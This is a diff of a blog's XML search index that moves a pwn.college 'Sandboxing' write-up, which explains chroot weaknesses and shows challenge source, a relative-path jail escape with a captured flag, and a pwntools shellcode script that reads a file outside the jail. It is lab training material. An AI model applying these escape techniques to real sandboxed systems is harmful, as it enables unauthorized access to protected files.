@@ -53,7 +53,7 @@
 <ul>
 <li><code>Linux GUI</code></li>
 <li>VSCode</li>
-<li>ssh -i <code>private key</code> <a href="mailto:&#104;&#x61;&#99;&#x6b;&#x65;&#114;&#64;&#100;&#111;&#106;&#x6f;&#46;&#x70;&#x77;&#x6e;&#46;&#x63;&#111;&#108;&#x6c;&#x65;&#x67;&#101;">&#104;&#x61;&#99;&#x6b;&#x65;&#114;&#64;&#100;&#111;&#106;&#x6f;&#46;&#x70;&#x77;&#x6e;&#46;&#x63;&#111;&#108;&#x6c;&#x65;&#x67;&#101;</a></li>
+<li>ssh -i <code>private key</code> <a href="mailto:&#x68;&#97;&#99;&#x6b;&#101;&#x72;&#x40;&#100;&#111;&#106;&#111;&#x2e;&#x70;&#119;&#x6e;&#46;&#x63;&#111;&#108;&#x6c;&#101;&#x67;&#101;">&#x68;&#97;&#99;&#x6b;&#101;&#x72;&#x40;&#100;&#111;&#106;&#111;&#x2e;&#x70;&#119;&#x6e;&#46;&#x63;&#111;&#108;&#x6c;&#101;&#x67;&#101;</a></li>
 </ul>
 <p>提供了一些交流平台</p>
 <ul>
@@ -393,6 +393,70 @@
 ]]></content>
   </entry>
   <entry>
+    <title>PwnCollege-Sandboxing</title>
+    <url>/wiki/2024/05/09/PwnCollege-Sandboxing/</url>
+    <content><![CDATA[<h2 id="Filesystem-Isolation"><a href="#Filesystem-Isolation" class="headerlink" title="Filesystem Isolation"></a>Filesystem Isolation</h2><p>chroot jail</p>
+<ul>
+<li><p>曾是实际中使用的沙箱模块</p>
+</li>
+<li><p>no syscall filtering or other isolation，功能较简单</p>
+</li>
+<li><p><font color="red">previously open resources</font></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">chroot</span> /tmp /bin/bash</span><br><span class="line">[sudo] password <span class="keyword">for</span> w3b5h3ll: </span><br><span class="line"><span class="built_in">chroot</span>: failed to run <span class="built_in">command</span> ‘/bin/bash’: No such file or directory</span><br><span class="line">(base) </span><br><span class="line"><span class="comment"># w3b5h3ll @ ubuntu22 in ~/Desktop/Doing [23:08:49] C:127</span></span><br><span class="line">$ <span class="built_in">ls</span> /bin/bash</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/PwnCollege-Sandboxing/2023-12-24-23-13-24-image.png"></p>
+<p><code>chroot</code>不会影响已打开资源，不会改变当前目录</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    chroot(<span class="string">&quot;/tmp/jail&quot;</span>);</span><br><span class="line">    <span class="comment">// chdir(&quot;/&quot;);</span></span><br><span class="line">    execl(<span class="string">&quot;/busybox&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(unknown) <span class="comment"># ls .</span></span><br><span class="line"><span class="built_in">chroot</span>    chroot.c</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls /</span></span><br><span class="line">busybox</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls tmp/jail</span></span><br><span class="line"><span class="built_in">ls</span>: tmp/jail: No such file or directory</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls /tmp</span></span><br><span class="line"><span class="built_in">ls</span>: /tmp: No such file or directory</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls ../../../tmp/jail/</span></span><br><span class="line">busybox</span><br><span class="line">sh: getcwd: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<h3 id="chroot-pitfalls"><a href="#chroot-pitfalls" class="headerlink" title="chroot pitfalls"></a>chroot pitfalls</h3><p>0x01 previously open resources</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在指定目录中执行相关操作</span></span><br><span class="line">int openat(int dirfd, char *pathname, int flags)</span><br><span class="line">int execveat(int dirfd, char *pathname, char **argv, char **envp, int flags)</span><br><span class="line">...</span><br><span class="line">*at();</span><br></pre></td></tr></table></figure>
+
+<p>Also misssing other forms of isolation:</p>
+<ul>
+<li><p>PID</p>
+</li>
+<li><p>network</p>
+</li>
+<li><p>IPC</p>
+</li>
+</ul>
+<p>更加先进的工具</p>
+<ul>
+<li><p>cgroups</p>
+</li>
+<li><p>namespaces</p>
+</li>
+<li><p>seccomp</p>
+</li>
+</ul>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The only thing you can do in this challenge is read out one single file, as specified by the first argument to the&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;program (argv[1]).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(argc &gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> jail_path[] = <span class="string">&quot;/tmp/jail-XXXXXX&quot;</span>;</span><br><span class="line">assert(mkdtemp(jail_path) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Creating a jail at `%s`.\n&quot;</span>, jail_path);</span><br><span class="line"></span><br><span class="line">assert(chroot(jail_path) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fffd = open(<span class="string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">write(fffd, <span class="string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">close(fffd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sending the file at `%s` to stdout.\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">sendfile(<span class="number">1</span>, open(argv[<span class="number">1</span>], <span class="number">0</span>), <span class="number">0</span>, <span class="number">128</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>chroot</code>只是改变了<code>/</code>，利用相对路径进行路径穿越</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FLAG&#123;FAKE&#125;hacker@sandboxing-level-1:~$ /challenge/babyjail_level1 ../../..//flag</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### Welcome to /challenge/babyjail_level1!</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line">This challenge will <span class="built_in">chroot</span> into a jail <span class="keyword">in</span> /tmp/jail-XXXXXX. You will be able to easily <span class="built_in">read</span> a fake flag file inside this</span><br><span class="line">jail, not the real flag file outside of it. If you want the real flag, you must escape.</span><br><span class="line"></span><br><span class="line">The only thing you can <span class="keyword">do</span> <span class="keyword">in</span> this challenge is <span class="built_in">read</span> out one single file, as specified by the first argument to the</span><br><span class="line">program (argv[1]).</span><br><span class="line"></span><br><span class="line">Creating a jail at `/tmp/jail-mwvxp7`.</span><br><span class="line">Sending the file at `../../..//flag` to stdout.</span><br><span class="line">pwn.college&#123;862JxWRgpdvPUfPoezc4ZwqrhEc.QXxMjMsMjM0YzW&#125;</span><br><span class="line">hacker@sandboxing-level-1:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Checking to make sure you&#x27;re not trying to open the flag.\n&quot;</span>);</span><br><span class="line">assert(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">&quot;flag&quot;</span>) == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// shellcode</span></span><br><span class="line"><span class="type">void</span> *shellcode = mmap((<span class="type">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">assert(shellcode == (<span class="type">void</span> *)<span class="number">0x1337000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> shellcode_size = read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
+
+<p>实现</p>
+<ul>
+<li><p>&#x2F;tmp创建指向<code>/flag</code>的软连接<code>/tmp/flag</code></p>
+</li>
+<li><p>shellcode读取<code>../flag</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_path = <span class="string">&#x27;/challenge/babyjail_level2&#x27;</span></span><br><span class="line">bin_args = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;/challenge/babyjail_level2&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rbx, 0x00007878782f2e2e</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rax</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov r10, 512</span></span><br><span class="line"><span class="string">    mov rax, 40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([bin_path, bin_args])</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert(chroot(jail_path) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Moving the current working directory into the jail.\n&quot;</span>);</span><br><span class="line">assert(chdir(<span class="string">&quot;/&quot;</span>) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fffd = open(<span class="string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">write(fffd, <span class="string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">close(fffd);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>System Security</tag>
+      </tags>
+  </entry>
+  <entry>
     <title></title>
     <url>/wiki/2024/05/09/PwnCollege-RaceConditions/</url>
     <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
@@ -613,70 +677,6 @@ CVE-2020-12652</p>
 
 <h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacker@race-conditions~level1-0:/challenge$ ./babyrace_level1.0 </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### Welcome to ./babyrace_level1.0!</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line">Through this series of challenges, you will become familiar with the concept of race conditions. This challenge allows</span><br><span class="line">you to open a single file, as specified by the first argument to the program (argv[1]).</span><br><span class="line"></span><br><span class="line">The file opened will be be sent to you.</span><br><span class="line"></span><br><span class="line">This challenge will verify that the file<span class="string">&#x27;s path does not include &quot;flag&quot;.</span></span><br><span class="line"><span class="string">This challenge will verify that the file is not a symlink.</span></span><br><span class="line"><span class="string">babyrace_level1.0: &lt;stdin&gt;:47: main: Assertion `argc &gt; 1&#x27;</span> failed.</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure>
 ]]></content>
-  </entry>
-  <entry>
-    <title>PwnCollege-Sandboxing</title>
-    <url>/wiki/2024/05/09/PwnCollege-Sandboxing/</url>
-    <content><![CDATA[<h2 id="Filesystem-Isolation"><a href="#Filesystem-Isolation" class="headerlink" title="Filesystem Isolation"></a>Filesystem Isolation</h2><p>chroot jail</p>
-<ul>
-<li><p>曾是实际中使用的沙箱模块</p>
-</li>
-<li><p>no syscall filtering or other isolation，功能较简单</p>
-</li>
-<li><p><font color="red">previously open resources</font></p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo <span class="built_in">chroot</span> /tmp /bin/bash</span><br><span class="line">[sudo] password <span class="keyword">for</span> w3b5h3ll: </span><br><span class="line"><span class="built_in">chroot</span>: failed to run <span class="built_in">command</span> ‘/bin/bash’: No such file or directory</span><br><span class="line">(base) </span><br><span class="line"><span class="comment"># w3b5h3ll @ ubuntu22 in ~/Desktop/Doing [23:08:49] C:127</span></span><br><span class="line">$ <span class="built_in">ls</span> /bin/bash</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
-
-<p><img src="/wiki/PwnCollege-Sandboxing/2023-12-24-23-13-24-image.png"></p>
-<p><code>chroot</code>不会影响已打开资源，不会改变当前目录</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    chroot(<span class="string">&quot;/tmp/jail&quot;</span>);</span><br><span class="line">    <span class="comment">// chdir(&quot;/&quot;);</span></span><br><span class="line">    execl(<span class="string">&quot;/busybox&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(unknown) <span class="comment"># ls .</span></span><br><span class="line"><span class="built_in">chroot</span>    chroot.c</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls /</span></span><br><span class="line">busybox</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls tmp/jail</span></span><br><span class="line"><span class="built_in">ls</span>: tmp/jail: No such file or directory</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls /tmp</span></span><br><span class="line"><span class="built_in">ls</span>: /tmp: No such file or directory</span><br><span class="line">sh: getcwd: No such file or directory</span><br><span class="line">(unknown) <span class="comment"># ls ../../../tmp/jail/</span></span><br><span class="line">busybox</span><br><span class="line">sh: getcwd: No such file or directory</span><br></pre></td></tr></table></figure>
-
-<h3 id="chroot-pitfalls"><a href="#chroot-pitfalls" class="headerlink" title="chroot pitfalls"></a>chroot pitfalls</h3><p>0x01 previously open resources</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在指定目录中执行相关操作</span></span><br><span class="line">int openat(int dirfd, char *pathname, int flags)</span><br><span class="line">int execveat(int dirfd, char *pathname, char **argv, char **envp, int flags)</span><br><span class="line">...</span><br><span class="line">*at();</span><br></pre></td></tr></table></figure>
-
-<p>Also misssing other forms of isolation:</p>
-<ul>
-<li><p>PID</p>
-</li>
-<li><p>network</p>
-</li>
-<li><p>IPC</p>
-</li>
-</ul>
-<p>更加先进的工具</p>
-<ul>
-<li><p>cgroups</p>
-</li>
-<li><p>namespaces</p>
-</li>
-<li><p>seccomp</p>
-</li>
-</ul>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;jail, not the real flag file outside of it. If you want the real flag, you must escape.\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The only thing you can do in this challenge is read out one single file, as specified by the first argument to the&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;program (argv[1]).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(argc &gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> jail_path[] = <span class="string">&quot;/tmp/jail-XXXXXX&quot;</span>;</span><br><span class="line">assert(mkdtemp(jail_path) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Creating a jail at `%s`.\n&quot;</span>, jail_path);</span><br><span class="line"></span><br><span class="line">assert(chroot(jail_path) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fffd = open(<span class="string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">write(fffd, <span class="string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">close(fffd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sending the file at `%s` to stdout.\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">sendfile(<span class="number">1</span>, open(argv[<span class="number">1</span>], <span class="number">0</span>), <span class="number">0</span>, <span class="number">128</span>);</span><br></pre></td></tr></table></figure>
-
-<p><code>chroot</code>只是改变了<code>/</code>，利用相对路径进行路径穿越</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FLAG&#123;FAKE&#125;hacker@sandboxing-level-1:~$ /challenge/babyjail_level1 ../../..//flag</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### Welcome to /challenge/babyjail_level1!</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"></span><br><span class="line">This challenge will <span class="built_in">chroot</span> into a jail <span class="keyword">in</span> /tmp/jail-XXXXXX. You will be able to easily <span class="built_in">read</span> a fake flag file inside this</span><br><span class="line">jail, not the real flag file outside of it. If you want the real flag, you must escape.</span><br><span class="line"></span><br><span class="line">The only thing you can <span class="keyword">do</span> <span class="keyword">in</span> this challenge is <span class="built_in">read</span> out one single file, as specified by the first argument to the</span><br><span class="line">program (argv[1]).</span><br><span class="line"></span><br><span class="line">Creating a jail at `/tmp/jail-mwvxp7`.</span><br><span class="line">Sending the file at `../../..//flag` to stdout.</span><br><span class="line">pwn.college&#123;862JxWRgpdvPUfPoezc4ZwqrhEc.QXxMjMsMjM0YzW&#125;</span><br><span class="line">hacker@sandboxing-level-1:~$ </span><br></pre></td></tr></table></figure>
-
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Checking to make sure you&#x27;re not trying to open the flag.\n&quot;</span>);</span><br><span class="line">assert(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">&quot;flag&quot;</span>) == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// shellcode</span></span><br><span class="line"><span class="type">void</span> *shellcode = mmap((<span class="type">void</span> *)<span class="number">0x1337000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">assert(shellcode == (<span class="type">void</span> *)<span class="number">0x1337000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> shellcode_size = read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
-
-<p>实现</p>
-<ul>
-<li><p>&#x2F;tmp创建指向<code>/flag</code>的软连接<code>/tmp/flag</code></p>
-</li>
-<li><p>shellcode读取<code>../flag</code></p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">bin_path = <span class="string">&#x27;/challenge/babyjail_level2&#x27;</span></span><br><span class="line">bin_args = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;/challenge/babyjail_level2&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rbx, 0x00007878782f2e2e</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rax</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov r10, 512</span></span><br><span class="line"><span class="string">    mov rax, 40</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([bin_path, bin_args])</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert(chroot(jail_path) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Moving the current working directory into the jail.\n&quot;</span>);</span><br><span class="line">assert(chdir(<span class="string">&quot;/&quot;</span>) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fffd = open(<span class="string">&quot;/flag&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">write(fffd, <span class="string">&quot;FLAG&#123;FAKE&#125;&quot;</span>, <span class="number">10</span>);</span><br><span class="line">close(fffd);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>System Security</tag>
-      </tags>
   </entry>
   <entry>
     <title></title>
